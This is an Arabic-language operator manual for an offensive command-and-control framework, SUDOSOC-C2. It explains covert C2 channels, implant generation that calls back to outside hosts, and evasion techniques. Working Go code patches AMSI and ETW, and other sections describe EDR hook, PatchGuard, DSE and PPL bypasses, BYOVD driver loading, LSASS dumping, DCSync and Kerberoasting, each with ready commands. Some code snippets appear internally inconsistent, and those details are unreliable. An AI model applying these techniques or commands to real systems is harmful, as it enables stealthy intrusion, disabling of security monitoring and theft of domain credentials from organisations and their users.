# SUDOSOC-C2 — الدليل التقني الشامل

```
███████╗██╗   ██╗██████╗  ██████╗ ███████╗ ██████╗  ██████╗     ██████╗██████╗
██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██╔════╝    ██╔════╝╚════██╗
███████╗██║   ██║██║  ██║██║   ██║███████╗██║   ██║██║         ██║      █████╔╝
╚════██║██║   ██║██║  ██║██║   ██║╚════██║██║   ██║██║         ██║     ██╔═══╝
███████║╚██████╔╝██████╔╝╚██████╔╝███████║╚██████╔╝╚██████╗    ╚██████╗███████╗
╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝     ╚═════╝╚══════╝
```

> **الدليل التقني الكامل — كل هجوم، كيف يعمل، وماذا يحقق**
>
> المؤلف: Seif (@sudosoc) | الإصدار: v2.0.0 | 2026

---

## فهرس المحتويات

| القسم | الموضوع |
|-------|---------|
| [1](#1-بنية-المشروع-والمفاهيم-الأساسية) | بنية المشروع والمفاهيم الأساسية |
| [2](#2-قنوات-الاتصال-c2-channels) | قنوات الاتصال — C2 Channels |
| [3](#3-محرك-phantom--توليد-الـ-implants) | محرك Phantom — توليد الـ Implants |
| [4](#4-تقنيات-التهرب-evasion-techniques) | تقنيات التهرب — Evasion Techniques |
| [5](#5-رفع-الصلاحيات-privilege-escalation) | رفع الصلاحيات — Privilege Escalation |
| [6](#6-هجمات-active-directory) | هجمات Active Directory |
| [7](#7-الثبات-على-مستوى-hardware) | الثبات على مستوى Hardware |
| [8](#8-محرك-الـ-hypervisor--vmx-engine) | محرك الـ Hypervisor — VMX Engine |
| [9](#9-الأمن-التشغيلي-opsec) | الأمن التشغيلي — OPSEC |
| [10](#10-ما-بعد-الاختراق-post-exploitation) | ما بعد الاختراق — Post-Exploitation |
| [11](#11-الـ-multiplayer-والعمل-الجماعي) | الـ Multiplayer والعمل الجماعي |
| [12](#12-الذكاء-الاصطناعي-المدمج) | الذكاء الاصطناعي المدمج |
| [13](#13-الامتدادات-والـ-bof) | الامتدادات والـ BOF |
| [14](#14-kill-chain--تسلسل-الهجوم-الكامل) | Kill Chain — تسلسل الهجوم الكامل |

---

## 1. بنية المشروع والمفاهيم الأساسية

### مكونات SUDOSOC-C2 الثلاثة

```
┌─────────────────────────────────────────────────────┐
│                   المشغّل (Operator)                  │
│              sudosoc-client                          │
└──────────────────────┬──────────────────────────────┘
                       │  gRPC / mTLS (port 47443)
                       │
┌──────────────────────▼──────────────────────────────┐
│                    الـ Server                         │
│              sudosoc-server                          │
│   • إدارة الـ sessions     • توليد الـ implants      │
│   • الـ listeners          • قاعدة البيانات          │
└──────────────────────┬──────────────────────────────┘
                       │  C2 Channel (mTLS/HTTP/DNS/...)
                       │
┌──────────────────────▼──────────────────────────────┐
│              الـ Implant (Phantom)                    │
│         يعمل على جهاز الضحية                         │
│   • تنفيذ الأوامر    • رفع البيانات                  │
│   • التهرب           • الثبات                        │
└─────────────────────────────────────────────────────┘
```

### مصطلحات أساسية

| المصطلح | الشرح |
|---------|-------|
| **Session** | اتصال مباشر مستمر بين الـ implant والـ server |
| **Beacon** | implant يتصل كل فترة زمنية (check-in) ثم يختفي |
| **Listener** | خدمة تنتظر اتصالات الـ implants على الـ server |
| **Payload** | الكود الثنائي للـ implant |
| **Loot** | البيانات والـ credentials التي تُجمَّع |
| **Pivot** | استخدام جهاز مخترق كـ relay للوصول لشبكات أخرى |
| **BOF** | Beacon Object File — كود صغير يُنفَّذ داخل الـ implant |

---

## 2. قنوات الاتصال — C2 Channels

### 2.1 mTLS — Mutual TLS

#### ما هو؟
قناة C2 مشفّرة بالكامل تستخدم بروتوكول TLS 1.3 مع التحقق من الهوية في الاتجاهين. كلا الطرفين (الـ server والـ implant) يملكان شهادات ويتحققان من بعضهما.

#### كيف يعمل تقنياً؟

```
Implant                          Server
   │                                │
   │── TLS ClientHello ─────────────►│
   │◄─ TLS ServerHello + Cert ───────│
   │   [يتحقق من cert الـ server]    │
   │── Client Certificate ──────────►│
   │   [الـ server يتحقق من cert]    │
   │◄──── TLS Handshake Done ────────│
   │                                │
   │══ Encrypted gRPC Messages ════►│
   │◄═ Encrypted gRPC Messages ═════│
```

#### ماذا يحقق؟
- **الخصوصية الكاملة:** لا أحد يستطيع قراءة الاتصال حتى لو اعترضه
- **المصادقة:** لا implant مزيف يستطيع الاتصال بالـ server
- **الثقة الصفرية:** حتى الـ server لا يقبل أي implant بدون الشهادة الصحيحة

#### الاستخدام
```bash
# تشغيل الـ listener
sudosoc > mtls --lhost 0.0.0.0 --lport 8888

# توليد implant
sudosoc > generate --mtls 192.168.1.100:8888 --os windows --arch amd64

# مع timeout مخصص
sudosoc > generate --mtls 192.168.1.100:8888 --os windows --reconnect 60
```

#### متى تستخدمه؟
- الاختراق الداخلي (internal pentest)
- عبر VPN
- عندما يكون لديك تحكم في الـ DNS

---

### 2.2 HTTPS مع Malleable C2 Profiles

#### ما هو؟
قناة C2 عبر HTTPS تستطيع تغيير شكلها الكامل لتبدو كأي نوع من الحركة الطبيعية على الشبكة.

#### كيف يعمل تقنياً؟

```
الـ Implant يرسل:
POST /api/v2/analytics/collect HTTP/1.1
Host: cdn.google.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Cookie: _ga=GA1.2.1234567890.1234567890
X-Custom-Header: [بيانات C2 مشفّرة بـ Base64]

Content: [payload مشفّر بـ AES-256 + HMAC]
```

من منظور الـ firewall وأدوات الـ network monitoring: طلب HTTP عادي لـ Google Analytics.

#### تخصيص الـ Profile

```yaml
# مثال C2 profile يحاكي Microsoft Update
name: "ms-update"
http-config:
  user_agent: "Microsoft-CryptoAPI/10.0"
  headers:
    - name: "X-MSDCS"
      value: "{{.SessionID}}"
  paths:
    - "/windowsupdate/v9/selfupdate/AU"
    - "/windowsupdate/v9/selfupdate/redir"
  encryption: aes256-cbc
  encoding: base64-url
```

#### ماذا يحقق؟
- يتجاوز الـ Proxy servers
- يتجاوز الـ DLP (Data Loss Prevention) systems
- يبدو كحركة عادية في الـ logs
- يعمل مع Domain Fronting لإخفاء الـ IP الحقيقي

#### Domain Fronting — إخفاء الـ C2 Server

```
الضحية ──► CDN (Cloudflare/Akamai) ──► C2 Server

من منظور الضحية: تتصل بـ cloudflare.com
الـ CDN يُوصّل الطلب لـ C2 server الحقيقي
```

```bash
sudosoc > generate --https cloudflare.com --os windows --domain-front c2.sudosoc.com
```

---

### 2.3 DNS — أعمق قناة للبيئات المقيّدة

#### ما هو؟
قناة C2 تخفي كل الاتصالات داخل طلبات DNS — البروتوكول الذي لا يمكن لأي شبكة حجبه تماماً.

#### كيف يعمل تقنياً؟

```
الإرسال (Implant → Server):
  الأمر: "whoami"
  ↓ تشفير + encoding
  ↓ تقسيم لـ labels صغيرة
  DNS Query: d4a2.b91c.3f7e.whoami.c2.sudosoc.com
  DNS Query: 0000.0001.0002.whoami.c2.sudosoc.com
  ...

الاستقبال (Server → Implant):
  DNS Response TXT record: [بيانات مشفّرة]
  أو DNS Response A record: [IP مشفّر يحمل البيانات]
```

#### DNS-over-HTTPS (DoH) — الطبقة الإضافية

```
بدلاً من:
  UDP port 53 (يُراقَب)

يستخدم:
  HTTPS port 443 → https://cloudflare-dns.com/dns-query

من منظور الشبكة: HTTPS عادي لـ Cloudflare
```

```bash
# مع DoH
sudosoc > generate --dns c2.sudosoc.com \
  --doh-url https://1.1.1.1/dns-query \
  --os windows
```

#### ماذا يحقق؟
- يعمل خلف الـ firewalls الأكثر تقييداً في العالم
- يعمل في الشبكات الحكومية والمصرفية
- لا يمكن حجبه بدون قطع الـ DNS كلياً

#### التأثير على الأداء
- **البطء:** DNS أبطأ من HTTP (latency عالية)
- **الحجم:** يُقسَّم البيانات لأجزاء صغيرة (طول الـ DNS label = 63 byte max)
- **الاستخدام الأمثل:** للـ Beacons مع check-in كل عدة دقائق

---

### 2.4 WireGuard

#### ما هو؟
قناة C2 مبنية على بروتوكول WireGuard VPN — أسرع وأحدث من OpenVPN و IPSec.

#### كيف يعمل تقنياً؟
```
WireGuard يستخدم:
• Curve25519  للـ key exchange
• ChaCha20    للتشفير
• Poly1305    للـ authentication (MAC)
• BLAKE2s     للـ hashing
• SipHash24   للـ hashtable keys

كل هذا في UDP packet واحد — overhead منخفض جداً
```

```bash
sudosoc > wg --lhost 0.0.0.0 --lport 51820
sudosoc > generate --wg 192.168.1.100:51820 --os linux
```

#### ماذا يحقق؟
- أسرع C2 channel في المشروع
- أمان تشفير state-of-the-art
- يبدو كـ VPN عادي لأدوات الـ monitoring

---

### 2.5 SMB Named Pipes — للحركة الداخلية

#### ما هو؟
قناة C2 تعمل داخلياً عبر الشبكة المحلية بدون أي اتصال بالإنترنت، باستخدام Named Pipes في Windows.

#### كيف يعمل تقنياً؟

```
جهاز A (implant) ──SMB Named Pipe──► جهاز B (pivot implant)
                                           │
                                     SMB/Internet
                                           │
                                      C2 Server
```

الـ implant على جهاز A لا يتصل بالإنترنت أبداً — يتصل فقط بجهاز B على الشبكة الداخلية، وجهاز B هو من يتواصل مع الـ server.

```bash
# على الجهاز الـ pivot
sudosoc (session_B) > pivots tcp --bind-port 9090

# generate implant يتصل عبر الـ pivot
sudosoc > generate --tcp-pivot <IP_of_B>:9090 --os windows
```

#### ماذا يحقق؟
- اختراق الشبكات المعزولة (air-gapped networks)
- التحرك الجانبي بدون ترك أثر network خارجي
- يتجاوز الـ Data Leakage Prevention systems

---

### 2.6 Dead-Drop — C2 عبر الخدمات السحابية

#### ما هو؟
قناة C2 غير مباشرة تستخدم خدمات سحابية مشروعة (Amazon S3, Pastebin, GitHub Gist, إلخ) كـ relay.

#### كيف يعمل تقنياً؟

```
                    ┌──────────────┐
Implant ────────────► Amazon S3   ◄──────────── Operator
  ↑                 │  Bucket     │                ↑
  │ يقرأ الأوامر   │             │ يكتب الأوامر   │
  │                └──────────────┘                │
  └─ يكتب النتائج                    يقرأ النتائج ─┘

لا اتصال مباشر بين الـ implant والـ C2 server أبداً
```

#### ماذا يحقق؟
- الـ C2 server لا يظهر في الـ network logs أبداً
- حركة الـ implant تبدو كـ S3/GitHub traffic مشروع
- يتجاوز أي Firewall يسمح بـ HTTPS

---

### 2.7 Timing Channel — القناة الأخفى

#### ما هو؟
قناة C2 تخفي البيانات في **توقيت** الطلبات وليس في محتواها — لا بيانات مخفية على الـ wire.

#### كيف يعمل تقنياً؟

```
الـ Encoding:
  Bit 1 → تأخير 100ms
  Bit 0 → تأخير 50ms

مثال: إرسال الحرف 'A' (ASCII 65 = 01000001):
  50ms, 100ms, 50ms, 50ms, 50ms, 50ms, 50ms, 100ms

من منظور الـ IDS:
  طلبات HTTP عادية بتوقيتات "طبيعية"
  لا payload مشبوه
  لا تشفير مريب
  لا شيء يمكن اكتشافه
```

#### ماذا يحقق؟
- تجاوز **كل** أدوات الـ DPI (Deep Packet Inspection)
- لا أثر في أي security log
- يعمل حتى في الشبكات التي تفحص كل byte من الحركة

#### التحديات
- بطيء جداً (kbps)
- يحتاج network ذو latency ثابتة
- مناسب فقط للأوامر القصيرة والـ check-ins

---

## 3. محرك Phantom — توليد الـ Implants

### 3.1 أنواع الـ Payloads

#### Session vs Beacon

```
Session (اتصال مستمر):
┌──────────────────────────────────────┐
│  Implant ══════════ Server           │
│         اتصال دائم مفتوح             │
│  استجابة فورية للأوامر               │
│  الخطر: connection دائم قابل للرصد   │
└──────────────────────────────────────┘

Beacon (check-in دوري):
┌──────────────────────────────────────┐
│  Implant ──────► Server (كل 60s)     │
│  يتصل ← يأخذ الأوامر ← ينقطع        │
│  ينفذ الأوامر offline                │
│  يتصل مجدداً لرفع النتائج            │
│  الميزة: معظم وقته offline = أصعب رصداً│
└──────────────────────────────────────┘
```

```bash
# Session
sudosoc > generate --mtls <IP> --os windows

# Beacon - check-in كل 60 ثانية مع ±30% jitter
sudosoc > generate beacon --mtls <IP> --seconds 60 --jitter 30 --os windows
```

#### أشكال الـ Payload

| الشكل | الاستخدام | الأمر |
|-------|-----------|-------|
| `exe` | ملف تنفيذي مستقل | `--format exe` |
| `shared` | DLL للتحميل في عملية أخرى | `--format shared` |
| `shellcode` | Raw shellcode للـ injection | `--format shellcode` |
| `service` | Windows Service | `--format service` |

```bash
# Shellcode للـ process injection
sudosoc > generate --mtls <IP> --os windows --format shellcode --save /tmp/payload.bin

# DLL Hijacking
sudosoc > generate --mtls <IP> --os windows --format shared --name "version.dll"

# Windows Service (للـ persistence)
sudosoc > generate --mtls <IP> --os windows --format service
```

### 3.2 خيارات التخصيص المتقدمة

```bash
# إزالة الـ debug symbols (حجم أصغر + صعوبة التحليل)
sudosoc > generate --mtls <IP> --os windows --skip-symbols

# تسمية العملية باسم مشروع
sudosoc > generate --mtls <IP> --os windows --name "svchost"

# تعديل الـ reconnect interval (الوقت بين محاولات الاتصال)
sudosoc > generate --mtls <IP> --os windows --reconnect 30

# تحديد الـ C2 limit (عدد المحاولات قبل الاستسلام)
sudosoc > generate --mtls <IP> --os windows --limit-datetime "2026-12-31"

# تفعيل كل تقنيات الـ evasion
sudosoc > generate --mtls <IP> --os windows --evasion

# Multi-channel مع failover تلقائي
sudosoc > generate \
  --mtls primary.c2.com:8888 \
  --https backup.c2.com:443 \
  --dns fallback.c2.com \
  --os windows
```

### 3.3 Implant Profiles — إعدادات محفوظة

```bash
# حفظ الإعدادات
sudosoc > profiles new \
  --name "corp-stealth" \
  --mtls 10.0.0.1:8888 \
  --os windows \
  --arch amd64 \
  --skip-symbols \
  --evasion \
  --reconnect 60

# استخدام الـ profile
sudosoc > profiles generate --profile corp-stealth

# عرض كل الـ profiles
sudosoc > profiles

# حذف profile
sudosoc > profiles rm --name corp-stealth
```

---

## 4. تقنيات التهرب — Evasion Techniques

### 4.1 Indirect Syscalls — التهرب من الـ EDR Hooks

#### المشكلة التي تحلها

```
كيف يعمل الـ EDR عادةً:
1. الـ EDR يكتب JMP instruction في أول 5 bytes من ntdll stubs
2. أي عملية تستدعي NtCreateFile مثلاً:
   → تمر عبر JMP الـ EDR
   → الـ EDR يفحص الطلب
   → إذا مريب → يحجبه

المشكلة بالنسبة للـ malware:
   VirtualAllocEx → JMP [EDR Hook] → BLOCKED
```

#### كيف تحل Indirect Syscalls هذا؟

```
الخطوة 1: Phantom يقرأ ntdll.dll من الذاكرة
           ويستخرج SSN (System Service Number)
           لكل function

           NtAllocateVirtualMemory → SSN = 0x18
           NtCreateFile           → SSN = 0x55
           ...

الخطوة 2: بدلاً من استدعاء NtAllocateVirtualMemory:
           MOV EAX, 0x18         ← SSN
           JMP [ntdll gadget]    ← يقفز لـ "syscall;ret" داخل ntdll

الخطوة 3: الـ CPU ينفذ الـ syscall
           من داخل صفحة ntdll الذاكرية

النتيجة:
• الـ EDR hook لم يُلمَس أبداً
• الـ kernel يرى ntdll كمصدر الـ syscall ← مشروع 100%
• call stack يُظهر ntdll ← مشروع 100%
```

#### تحليل Assembly الفعلي

```asm
; الكود في indirect_windows_amd64.s
TEXT ·IndirectSyscall(SB), NOSPLIT, $0-48
    MOVL  ssn+0(FP),      R11    ; R11 = رقم الـ syscall
    MOVQ  gadget+8(FP),   R10    ; R10 = عنوان gadget في ntdll
    MOVQ  args_base+16(FP), SI   ; SI  = مؤشر للـ arguments

    ; توزيع الـ arguments على registers الـ Windows API
    MOVQ 0(SI),  CX              ; arg[0] → RCX
    MOVQ 0(SI),  R10             ; arg[0] → R10 (Windows convention)
    MOVQ 8(SI),  DX              ; arg[1] → RDX
    MOVQ 16(SI), R8              ; arg[2] → R8
    MOVQ 24(SI), R9              ; arg[3] → R9

    MOVL  R11, AX                ; EAX = SSN
    JMP   R11                    ; قفز لـ gadget داخل ntdll
                                 ; "syscall; ret" ← kernel يراه كـ ntdll call
```

---

### 4.2 AMSI Bypass — تعمية Windows Defender

#### ما هو AMSI؟

```
AMSI = Antimalware Scan Interface

كل script/command يمر عبر:
PowerShell → AMSI → Windows Defender → نعم/لا
.NET       → AMSI → Windows Defender → نعم/لا
VBScript   → AMSI → Windows Defender → نعم/لا
```

#### كيف تعمل الـ Bypass؟

```
Phantom يحدد عنوان AmsiScanBuffer في amsi.dll في الذاكرة
↓
يستخدم VirtualProtect لجعل الصفحة قابلة للكتابة
↓
يكتب في أول bytes من الـ function:
  MOV EAX, 0x80070057   ; AMSI_RESULT_NOT_DETECTED
  RET
↓
الآن AmsiScanBuffer تعيد دائماً "نظيف"
↓
PowerShell/AMSI عميان تجاه كل الـ payloads
```

#### الكود الفعلي (amsi_windows.go)

```go
// تحديد عنوان AmsiScanBuffer
proc := windows.NewLazySystemDLL("amsi.dll").NewProc("AmsiScanBuffer")
addr := proc.Addr()

// جعل الصفحة قابلة للكتابة
var oldProtect uint32
windows.VirtualProtect(addr, 4, windows.PAGE_EXECUTE_READWRITE, &oldProtect)

// patch: MOV EAX, 0x80070057; RET
patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
copy((*[6]byte)(unsafe.Pointer(addr))[:], patch)

// استعادة الصلاحيات الأصلية
windows.VirtualProtect(addr, 4, oldProtect, &oldProtect)
```

#### ماذا يحقق؟
- تشغيل أي PowerShell script بدون detection
- تنفيذ .NET assemblies مشبوهة
- تحميل shellcode عبر IEX (Invoke-Expression)

---

### 4.3 ETW Bypass — تعمية سجل Windows Events

#### ما هو ETW؟

```
ETW = Event Tracing for Windows

يُسجّل:
• كل process يُشغَّل
• كل DLL يُحمَّل
• كل syscall مريب
• Network connections
• Registry access

أدوات تعتمد عليه: Sysmon, Process Monitor, Windows Defender ATP
```

#### كيف تعمل الـ Bypass؟

```
Phantom يبحث عن NtTraceEvent في ntdll.dll
↓
يُطبّق patch:
  MOV EAX, 0      ← STATUS_SUCCESS (وهمي)
  RET             ← يرجع فوراً بدون تسجيل أي شيء
↓
كل محاولات ETW للتسجيل تُعيد "نجاح" بدون فعل شيء
↓
Sysmon أعمى، Process Monitor أعمى، Defender ATP أعمى
```

#### الكود الفعلي (etw_windows.go)

```go
// patch NtTraceEvent
ntdll := windows.NewLazySystemDLL("ntdll.dll")
proc  := ntdll.NewProc("NtTraceEvent")

// XOR-encoded patch لتجنب signature detection
patch := []byte{
    0x48, 0x31, 0xC0,  // XOR RAX, RAX (EAX = 0)
    0xC3,              // RET
}
applyPatch(proc.Addr(), patch)
```

---

### 4.4 Sleep Obfuscation — الاختفاء أثناء النوم

#### المشكلة

```
الـ Beacon بين كل check-in:
• ينام لـ 60 ثانية
• طوال هذا الوقت في الذاكرة
• YARA scanners يمكنها رصده
• Memory forensics تجده
```

#### الحل: تشفير الذاكرة أثناء النوم

```
قبل النوم:
  1. Phantom يحسب XOR key عشوائي
  2. يشفّر HEAP كلها بهذا الـ key
  3. يشفّر STACK كلها
  4. ينام

أثناء النوم:
  الذاكرة = random bytes لا معنى لها
  YARA rules: لا match
  Memory scanner: لا signature

عند الاستيقاظ:
  يفك التشفير → يعود لحالته الطبيعية
```

#### الكود الفعلي (sleep_obfuscation_windows.go)

```go
func ObfuscatedSleep(duration time.Duration, aggressive bool) error {
    // 1. توليد XOR key عشوائي
    key := make([]byte, 32)
    rand.Read(key)

    // 2. الحصول على معلومات الـ heap
    heap := windows.GetProcessHeap()

    // 3. تشفير كل الذاكرة
    xorEncryptHeap(heap, key)
    xorEncryptStack(key)        // تشفير الـ stack الحالية

    // 4. النوم
    time.Sleep(duration)

    // 5. فك التشفير
    xorEncryptStack(key)        // نفس العملية تفك التشفير
    xorEncryptHeap(heap, key)

    return nil
}
```

---

### 4.5 Stack Spoofing — تزوير هوية الـ Thread

#### كيف يكتشف الـ EDR الـ malware عبر الـ Stack؟

```
عند نداء NtCreateFile مثلاً، الـ EDR يفحص:
  Stack Frame 0: ntdll!NtCreateFile
  Stack Frame 1: kernelbase!CreateFileW
  Stack Frame 2: implant.exe!RunPayload  ← مريب! ليس DLL مشروع
  Stack Frame 3: implant.exe!main

الـ EDR يحجب لأن الـ call جاء من implant.exe
```

#### كيف تعمل الـ Stack Spoofing؟

```
Phantom قبل أي syscall:
  1. يحفظ الـ return addresses الحقيقية
  2. يزيف الـ stack ليبدو هكذا:
     Stack Frame 0: ntdll!NtCreateFile
     Stack Frame 1: kernelbase!CreateFileW
     Stack Frame 2: ntdll!RtlUserThreadStart  ← يبدو كـ thread شرعي
     Stack Frame 3: kernel32!BaseThreadInitThunk

  3. ينفذ الـ syscall
  4. يُعيد الـ stack لحالتها الطبيعية

الـ EDR يرى thread شرعي من ntdll ← لا alert
```

#### الكود الفعلي (stackspoof_windows.go)

```go
// إنشاء frame مزيف يبدو كـ ntdll thread
func buildFakeFrame(gadget uintptr) *spoofedFrame {
    f := &spoofedFrame{}
    // عنوان RtlUserThreadStart في ntdll
    rtlStart := getNtdllExport("RtlUserThreadStart")
    f.returnAddr = rtlStart
    f.savedRBP   = 0
    return f
}
```

---

### 4.6 Argument Spoofing — إخفاء الـ Command Line

#### المشكلة

```
عند تشغيل process:
  CreateProcess("cmd.exe", "cmd.exe /c whoami", ...)
  
Sysmon Event ID 1 يُسجّل:
  CommandLine: cmd.exe /c whoami    ← مرئي للكل
```

#### الحل

```
Phantom يشغّل العملية بـ arguments وهمية:
  CreateProcess("cmd.exe", "cmd.exe /c notepad.exe", ...)
  ← يبدو بريئاً في الـ logs

ثم يُعدّل الـ Process Environment Block (PEB) مباشرة في الذاكرة:
  PEB → ProcessParameters → CommandLine = "cmd.exe /c whoami"
  ← الأمر الحقيقي

النتيجة:
  الـ process ينفذ: cmd.exe /c whoami
  Sysmon يُسجّل:   cmd.exe /c notepad.exe
```

---

### 4.7 Phantom DLL Hollowing

#### ما هو؟

```
بدلاً من حقن shellcode مباشرة في ذاكرة عملية:

الطريقة القديمة (مكشوفة):
  VirtualAlloc → WriteProcessMemory → CreateRemoteThread
  ← EDR يراه ويحجبه

Phantom DLL Hollowing:
  1. تحميل DLL مشروع موقّع (مثلاً version.dll)
  2. الـ EDR يرى "DLL مشروع مُحمَّل" ← لا alert
  3. تغيير صلاحيات .text section → RWX
  4. نسخ الـ shellcode فوق .text section
  5. تغيير الصلاحيات مجدداً → RX
  6. الـ shellcode ينفذ داخل version.dll

الـ EDR يرى: version.dll تعمل ← مشروع
الواقع: shellcode ينفذ متنكراً كـ version.dll
```

---

## 5. رفع الصلاحيات — Privilege Escalation

### 5.1 GetSystem — NT AUTHORITY\SYSTEM

#### ما هو؟
الوصول لأعلى مستوى صلاحيات في Windows — أعلى من أي مستخدم Admin عادي.

#### كيف يعمل؟

**الطريقة 1: Token Impersonation**
```
Phantom يبحث عن process يعمل بـ SYSTEM (مثلاً winlogon.exe)
↓
يستدعي OpenProcess → OpenProcessToken → DuplicateToken
↓
ImpersonateLoggedOnUser بالـ token المنسوخ
↓
الـ implant الآن يعمل بصلاحيات SYSTEM
```

**الطريقة 2: Named Pipe Impersonation**
```
Phantom يُنشئ Named Pipe
↓
يخدع SYSTEM service للاتصال بالـ pipe
↓
ImpersonateNamedPipeClient
↓
SYSTEM!
```

```bash
sudosoc (session) > getsystem
sudosoc (session) > getsystem --technique token-duplication
sudosoc (session) > getsystem --technique named-pipe
```

#### ماذا يحقق؟
- تجاوز الـ UAC بالكامل
- الوصول لـ LSASS
- تثبيت kernel drivers
- تعديل ملفات النظام

---

### 5.2 BYOVD — Bring Your Own Vulnerable Driver

#### ما هو؟
استخدام driver موقّع رقمياً من شركة موثوقة، لكنه يحتوي على ثغرة تسمح بتنفيذ كود في Ring-0 (kernel space).

#### لماذا يعمل هذا؟

```
Windows Kernel:
  يتحقق من توقيع الـ driver → موقّع من شركة X ← موثوق ✓
  يحمّله → ينفذه في Ring-0

ما لا يعلمه Windows:
  هذا الـ driver به ثغرة IOCTL تسمح بكتابة عشوائية في الذاكرة
```

#### تقنيات الاستغلال الشائعة

```
1. Arbitrary Memory Read/Write
   يطلب من الـ driver قراءة/كتابة أي عنوان ذاكرة
   → يكتب shellcode في kernel space
   → يُنفذه

2. Arbitrary Kernel Function Call
   بعض الـ drivers تتيح استدعاء kernel functions مباشرة

3. MSR Modification
   كتابة في Model-Specific Registers
   → تعطيل PatchGuard أو DSE
```

#### كيف يستخدمها SUDOSOC-C2

```bash
# رفع الـ driver للهدف
sudosoc (session) > upload /opt/tools/RTCore64.sys C:\Windows\Temp\drv.sys

# تثبيت الـ driver كـ service
sudosoc (session) > execute "sc create rtcore type= kernel start= demand binPath= C:\Windows\Temp\drv.sys"
sudosoc (session) > execute "sc start rtcore"

# تنفيذ BYOVD attack
sudosoc (session) > byovd --driver-path C:\Windows\Temp\drv.sys --action full
```

**مع auto-upload:**
```bash
sudosoc (session) > byovd --local-driver /opt/RTCore64.sys --action full
```

#### ماذا يحقق؟
- تنفيذ كود في Ring-0
- قراءة/كتابة أي ذاكرة kernel
- تعطيل security software
- تجاوز PatchGuard
- استخراج credentials من kernel

---

### 5.3 PatchGuard Bypass

#### ما هو PatchGuard؟

```
PatchGuard = Kernel Patch Protection (KPP)

وظيفته:
  يفحص دورياً هياكل kernel حساسة:
  • SSDT (System Service Descriptor Table)
  • IDT (Interrupt Descriptor Table)
  • Kernel code sections
  • Critical data structures

إذا وجد تغييراً → BSOD (Blue Screen of Death) فوري
```

#### كيف يتجاوزه Phantom؟

```
PatchGuard يُجدوَل عبر DPC callbacks و Timer callbacks

الهجوم:
1. Phantom يعترض عملية جدولة PatchGuard timer
2. يُعدّل الـ DPC routine قبل أن تُنفَّذ
3. PatchGuard يُجدوَل لكن routine الفحص تم تعطيلها
4. Phantom الآن يمكنه تعديل SSDT وكل هياكل الـ kernel

المفتاح: اعتراض الـ timer قبل أن PatchGuard يبدأ
```

#### ماذا يحقق؟
- تعديل SSDT → hook أي syscall
- إخفاء processes وملفات على مستوى kernel
- تحميل rootkits بدون detection

---

### 5.4 DSE Bypass — تحميل Drivers غير موقّعة

#### ما هو Driver Signature Enforcement؟

```
Windows 64-bit:
  يرفض تحميل أي kernel driver غير موقّع رقمياً
  حتى لو كنت SYSTEM أو Admin
  → هذا يمنع معظم الـ rootkits
```

#### كيف يتجاوزه Phantom؟

```
الـ variable المسؤول: g_CiEnabled في ci.dll

Phantom (بعد BYOVD):
  1. يبحث عن عنوان g_CiEnabled في الذاكرة
  2. يكتب القيمة 0 (disabled)
  3. يحمّل أي driver غير موقّع
  4. يُعيد g_CiEnabled = 1 (enabled)

أو عبر مسار أبسط:
  تعديل SeLoadDriverPrivilege + UEFI Secure Boot bypass
```

```bash
sudosoc (session) > dse-bypass
# الآن يمكن تحميل أي driver kernel
sudosoc (session) > execute "sc create rootkit type= kernel binPath= C:\rootkit.sys"
```

---

### 5.5 PPL Bypass — اختراق Protected Processes

#### ما هو PPL؟

```
PPL = Protected Process Light

يحمي عمليات مثل:
  lsass.exe → يحمل كل الـ credentials
  csrss.exe → Windows subsystem
  antivirus processes

حتى SYSTEM لا يمكنه:
  OpenProcess(PROCESS_ALL_ACCESS, lsass.exe)
  → ACCESS DENIED
```

#### كيف يتجاوزه Phantom؟

```
كل عملية محمية لها مستوى حماية في EPROCESS structure:
  PS_PROTECTION {
    Level: 0x62  ← PPL Windows Tcb
  }

Phantom (مع kernel access):
  يقرأ عنوان EPROCESS لـ lsass
  يكتب Level = 0x00 (بدون حماية)
  الآن يمكن OpenProcess بكل الصلاحيات
```

#### ماذا يحقق بعد bypass LSASS؟

```bash
# بعد PPL bypass
sudosoc (session) > procdump --pid <lsass_pid>
# يُصدر ملف .dmp يحتوي على:
# • كل الـ NTLM hashes
# • Kerberos tickets
# • Cleartext passwords (في حالات معينة)
# • Domain credentials
```

---

## 6. هجمات Active Directory

### 6.1 DCSync — محاكاة Domain Controller

#### ما هو؟

```
Domain Controllers تتزامن فيما بينها عبر MS-DRSR protocol
(Directory Replication Service Remote Protocol)

DC يطلب من DC آخر:
"أعطني كل الـ changes منذ آخر تزامن"
← يحصل على كل الـ objects بما فيها password hashes
```

#### كيف يستغل Phantom هذا؟

```
Phantom يتنكر كـ Domain Controller:
↓
يرسل طلب DsGetNCChanges للـ DC الحقيقي
↓
DC يُجيب: "أهلاً بك، هذه كل الـ user objects + hashes"
↓
Phantom يستخرج:
  • NTLM hash لكل user
  • Kerberos keys
  • Password history
  • Account metadata
```

#### المتطلبات
- صلاحية `Replicating Directory Changes All` على الـ domain
- عادةً موجودة في: Domain Admins, Enterprise Admins, DC computers

```bash
# استخراج user محدد
sudosoc (session) > dcsync --domain corp.local --user krbtgt
# استخراج الكل
sudosoc (session) > dcsync --domain corp.local --all
```

#### الأثر

```
الإخراج:
  Username: Administrator
  NTLM: aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
  AES256: 8f3b...
  
الاستخدام:
  Pass-the-Hash → وصول فوري كـ Administrator
  Silver/Golden Ticket → سيطرة كاملة على الـ domain
```

---

### 6.2 Kerberoasting

#### ما هو؟

```
كل Service Account في AD يملك SPN (Service Principal Name)
مثلاً: MSSQLSvc/db.corp.local:1433

أي مستخدم في الـ domain يمكنه طلب TGS ticket لهذا الـ SPN
الـ TGS مُشفَّر بـ password hash الـ service account

→ يمكن أخذ هذا الـ ticket وكسر تشفيره offline
```

#### كيف يعمل الهجوم؟

```
1. Phantom يُرسل KRB_TGS_REQ لـ KDC
   طالباً ticket للـ SPN: MSSQLSvc/db.corp.local

2. KDC يُرجع TGS ticket مُشفَّر بـ:
   RC4-HMAC(password of SQL service account)

3. Phantom يحفظ الـ ticket بصيغة Hashcat

4. Offline: 
   hashcat -m 13100 ticket.hash wordlist.txt
   → اختبار ملايين الكلمات في الثانية

5. النتيجة: password الـ SQL service account
```

```bash
sudosoc (session) > kerberoast
# يُصدر ملف compatible مع Hashcat/John
# sudosoc_kerberoast_20260101_120000.txt
